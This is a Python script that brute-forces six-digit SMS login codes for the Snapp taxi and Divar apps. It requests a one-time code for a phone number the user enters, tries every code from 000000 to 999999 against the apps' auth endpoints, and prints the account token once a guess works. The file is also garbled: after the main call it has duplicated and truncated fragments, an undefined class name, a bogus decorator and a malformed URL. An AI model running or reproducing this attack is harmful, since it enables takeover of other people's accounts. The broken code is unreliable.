from requests import post
from colorama import init
init()
class digi:
    class colors:
        RED = '\033[00;31m'
        GREEN = '\033[00;32m'
        LIGHT_GREEN = '\033[01;32m'
        YELLOW = '\033[01;33m'
        LIGHT_RED = '\033[01;31m'
        BLUE = '\033[00;34m'
        PINK = '\033[01;35m'
        CYAN = '\033[00;36m'

    @staticmethod
    def test_normal(mobile_number):

        for i in range(1000000):
            i = str(i).zfill(6)
            payload = {"phone": mobile_number, "code": i}
            response = post("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", json=payload)
            info = response.json()

            if 'message' in info:
                if 'کد تایید معتبر نیست.' == info['message']:
                    print(f"\n\n{digi.colors.RED}[{digi.colors.GREEN}√{digi.colors.RED}] {digi.colors.GREEN}code mashkoke ! => {i}")
                else:
                    print(f"\n\n{digi.colors.RED}[{digi.colors.GREEN}√{digi.colors.RED}] {digi.colors.GREEN}code ine! => {i}\n{digi.colors.RED}[{digi.colors.GREEN}√{digi.colors.RED}] {digi.colors.GREEN}Token: {info['message']}")
            elif 'token' in info:
                print(f"\n\n{digi.colors.RED}[{digi.colors.GREEN}√{digi.colors.RED}] {digi.colors.GREEN}code ine ! => {i}\n{digi.colors.RED}[{digi.colors.GREEN}√{digi.colors.RED}] {digi.colors.GREEN}Token: {info['token']}")
                exit()

    @bridgezan
    def test_custom(mobile_number):

        number = input(f"{digi.colors.RED}[{digi.colors.LIGHT_GREEN}={digi.colors.RED}] {digi.colors.GREEN}ba che shomare i shoroe she?{Divar.colors.YELLOW} 6 digits (ex : 300000) : {Divar.colors.CYAN}")
        for i in range(int(number), 999999):
            payload = {"phone": mobile_number, "code": str(i)}
            response = post("https://api.divar.ir/v5/auth/confirm", json=payload)
            info = response.json()
            if 'message' in info:
                if 'کد تایید معتبر نیست.' == info['message']:
                    print(f"{digi.colors.RED}[{digi.colors.RED}×{digi.colors.RED}] {digi.colors.RED}code mashkoke  ! => {i}")
                else:
                    print(f"\n\n{digi.colors.RED}[{digi.colors.LIGHT_GREEN}√{digi.colors.RED}] {digi.colors.GREEN}ok shod afarin=> {digi.colors.LIGHT_GREEN}{i}\n{digi.colors.RED}[{digi.colors.LIGHT_GREEN}√{digi.colors.RED}] {digi.colors.GREEN}Token: {digi.colors.LIGHT_GREEN}{info['message']}")
            elif 'token' in info:
                print(f"\n\n{digi.colors.RED}[{digi.colors.LIGHT_GREEN}√{digi.colors.RED}] {digi.colors.GREEN}ok shod afarin=> {digi.colors.LIGHT_GREEN}{i}\n{digi.colors.RED}[{digi.colors.LIGHT_GREEN}√{digi.colors.RED}] {digi.colors.GREEN}Token: {digi.colors.LIGHT_GREEN}{info['token']}")
                exit()

    def common(self):
        print (f"""{digi.colors.CYAN}

                                                                                
                             codded by bridgezan                       
                                                                                
{Divar.colors.LIGHT_RED}                                                                                                                                                                                    
              #@#%*.   .@=   =@. %*    #@#     #@#%#:     
              #% .@+   .@=   .@+-@-   .@%@.    #%.:@#     
              #% .@+   .@=    *%*%    =@:@=    #@*%@:     
              #%.-@=   .@=    :@@=    #@+@#    #%  @*     
              +##*-    .#-     *#.    #=.=#    ++  #=     
                      {digi.colors.RED}bridgezan          
						
""")
        mobile_number = input(f"{digi.colors.LIGHT_RED}[{digi.colors.LIGHT_GREEN}={digi.colors.LIGHT_RED}] {digi.colors.GREEN}shomare ro vared konid :{digi.colors.CYAN} ")  
        post("https://api.divar.ir/v8/auth/authenticate",json={"phone":mobile_number})
        type_no = input(f"\n\n{digi.colors.LIGHT_RED}[{digi.colors.LIGHT_GREEN}1{digi.colors.LIGHT_RED}] {digi.colors.GREEN}Test adad az 000000 ta 999999 \n{digi.colors.RED}[{digi.colors.LIGHT_GREEN}2{digi.colors.RED}] {digi.colors.GREEN}ye adadi ke mikhoi bego \n\n  ==> {digi.colors.CYAN}")
        if type_no == "1":
            self.test_normal(mobile_number)
        elif type_no == "2":
            self.test_custom(mobile_number)
        else:
            print(f"{digi.colors.RED}error ! ")
            exit()

digi().common()
                            
{digi.colors.LIGHT_RED}                                                                                                                                                                                    

                      {digi.colors.RED}Git & Tg : @bridgezan           
						
""")
        mobile_number = input(f"{digi.colors.LIGHT_RED}[{digi.colors.LIGHT_GREEN}={digi.colors.LIGHT_RED}] {digi.colors.GREEN}shomare ro vared kon:{digi.colors.CYAN} ")  
        post(https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"",json={"phone":mobile_number})
        type_no = input(f"\n\n{digi.colors.LIGHT_RED}[{digi.colors.LIGHT_GREEN}1{digi.colors.LIGHT_RED}] {digi.colors.GREEN}Test numbers from 000000 to 999999 \n{digi.colors.RED}[{digi.colors.LIGHT_GREEN}2{digi.colors.RED}] {digi.colors.GREEN}Be a custom number (start testing from any number you want) \n\n  ==> {digi.colors.CYAN}")
        if type_no == "1":
            self.test_normal(mobile_number)
        elif type_no == "2":
            self.test_custom(mobile_number)
        else:
            print(f"{digi.colors.RED}error ! ")
            exit()

digi().common()
t_custom(mobile_number)
        else:
            print(f"{Divar.colors.RED}error ! ")
            exit()

Divar().common()
